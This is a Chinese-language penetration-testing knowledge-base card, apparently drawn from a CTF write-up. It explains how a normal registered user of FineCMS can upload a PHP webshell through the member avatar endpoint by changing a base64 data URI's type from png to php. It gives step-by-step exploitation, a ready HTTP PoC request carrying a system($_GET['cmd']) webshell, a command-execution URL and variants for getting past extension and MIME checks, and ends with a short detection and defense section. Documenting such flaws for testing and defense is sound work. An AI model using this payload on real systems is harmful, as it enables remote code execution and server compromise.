---
id: web-generic-file-upload-finecms-avatar-base64-php-webshell
title: FineCMS 会员头像 base64 上传改后缀为 php：注册普通账号即可写 PHP WebShell
type: scenario
domain: web
path: web/generic/file-upload
technique: finecms-avatar-base64-php-webshell
tags:
- finecms
- php
- file-upload
- avatar
- webshell
- base64
- extension-bypass
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V73
  verified_at: '2026-11-05T16:32:29+08:00'
  notes: 已对照原文核对：图11 FineCMS 页面、图12 注册 123/test@qq.com、图13 会员中心上传头像、图14/15 抓包见 t=data:image/png;base64 与 'Unable to save the image' 报错、图16 蚁剑连接 /uploadfile/member/3/0x0.php 成功、图17 SYSTEM 读 flag；卡内改 data URI 子类型/后缀为 php 与原文路径一致。未验证点：未复跑上传；原文页面仅显示公益版 v5.0.0 横幅、未给受影响区间，未设 affected_versions。
url: /docs/web/generic/file-upload/web-generic-file-upload-finecms-avatar-base64-php-webshell/
draft: false
kb_aliases:
- FineCMS 头像上传 getshell
- FineCMS 任意文件上传
- 会员头像 data URI 改后缀
- base64 图片马写 php
- FineCMS v5 WebShell
---

## 一句话结论

FineCMS 公益版会员中心的头像上传把 `t` 参数当作 data URI 解码后保存到 Web 可访问的 `/uploadfile/member/<uid>/` 目录；注册普通会员后抓包，把 data URI 的子类型/后缀从 `png` 改为 `php`，即可把含 `<?php ...?>` 的内容写成 `.php` 文件，访问后直接执行，用蚁剑等客户端即可连接。

## 原理

- 会员头像上传接口（原文为 `/index.php?s=member&c=account&m=avatar`）接收 `t` 参数，其值是 `data:image/png;base64,<base64>` 形式的 data URI；服务端解码 base64 后按该 URI 的类型/后缀把文件保存到 `uploadfile/member/<用户ID>/` 下。
- 服务端没有对最终扩展名做白名单校验，或校验只针对初始图片类型；抓包把 `data:image/png` 改成 `data:image/php`（或等价的扩展名字段改成 `php`），解码后的内容就会以 `.php` 落盘。
- 上传目录位于 Web 根下且允许 PHP 解析，访问 `http://target/uploadfile/member/<uid>/<name>.php` 时 PHP 代码执行；原文最终路径为 `/uploadfile/member/3/0x0.php`。
- 上传接口对普通注册用户开放，攻击者无需后台权限；第一次上传可能返回 “Unable to save the image...” 之类的通用错误，但改后缀后文件可正常落地，需以实际访问结果为准（响应报错不等于未写入）。

## 触发条件

- 目标为 FineCMS（原文页面显示公益版 v5.0.0），会员注册开放；
- 头像上传接口可访问，`t` 参数接受 data URI 且最终扩展名可控；
- `uploadfile/member/<uid>/` 目录可写且 Web 服务器解析 `.php`；
- 攻击者能注册/登录普通会员账号，并抓包修改上传请求。

## 利用步骤

1. 打开站点，注册普通会员（原文使用 `123` / `test@qq.com`）。
2. 登录会员中心，进入“修改资料 → 上传头像”，选择一张图片并抓包。
3. 在请求体中找到 `t=data%3Aimage%2Fpng%3Bbase64%2C...`，将其中的 `png` 改为 `php`（或把等价的扩展名/文件名字段改为 `php`），保留 base64 内容中的 PHP 代码（图片一句话木马）。
4. 放行请求，记录响应中的文件路径；访问 `/uploadfile/member/<uid>/<name>.php` 验证是否执行。
5. 用蚁剑/冰蝎等客户端连接该 URL，执行命令、读取 flag；清理上传文件。

## PoC

```http
POST /index.php?s=member&c=account&m=avatar HTTP/1.1
Host: target:8008
Content-Type: application/x-www-form-urlencoded

t=data%3Aimage%2Fphp%3Bbase64%2CPD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4%3D
```

上面的 base64 解码为 `<?php system($_GET['cmd']);?>`；实际测试可把 `php` 替换为 `php3`/`phtml` 等目标可解析后缀，或使用带图片头的图片马绕过内容检测。

```text
访问：http://target:8008/uploadfile/member/3/0x0.php?cmd=whoami
```

## 变体与关联

- 变体：若服务端校验 MIME/图片头，可在合法图片中嵌入 PHP 代码并把后缀改为可解析脚本后缀；或改 data URI 子类型为 `php3`/`phtml` 等。
- 变体：其他 FineCMS 上传接口（附件、编辑器、后台模板）也可能存在同类扩展名问题，需逐个验证。
- 关联：通用头像上传改后缀 [[web-generic-file-upload-aspnet-avatar-extension-aspx-webshell]]、资料更新原名落盘 [[web-generic-file-upload-user-controlled-filename-webshell]]、PHP 上传后执行 [[web-php-file-inclusion-user-ini-auto-prepend-rce]]。

## 检测与防御

- 检测：请求体中出现 `data:image/php`、`data:image/php3`、`data:image/phtml` 等异常子类型；`uploadfile/member/` 下出现 `.php` 文件；普通会员注册后立即上传并访问新文件；蚁剑/冰蝎特征流量。
- 防御：服务端按白名单校验扩展名与 MIME，并重新编码图片；上传文件存到 Web 根外或禁止脚本执行；文件名随机化且不使用客户端提供的扩展名；对上传目录做文件完整性监控；限制会员上传频率与内容。
- 注意：通用错误响应不代表上传失败，应直接访问目标路径验证；测试时避免上传破坏性载荷。
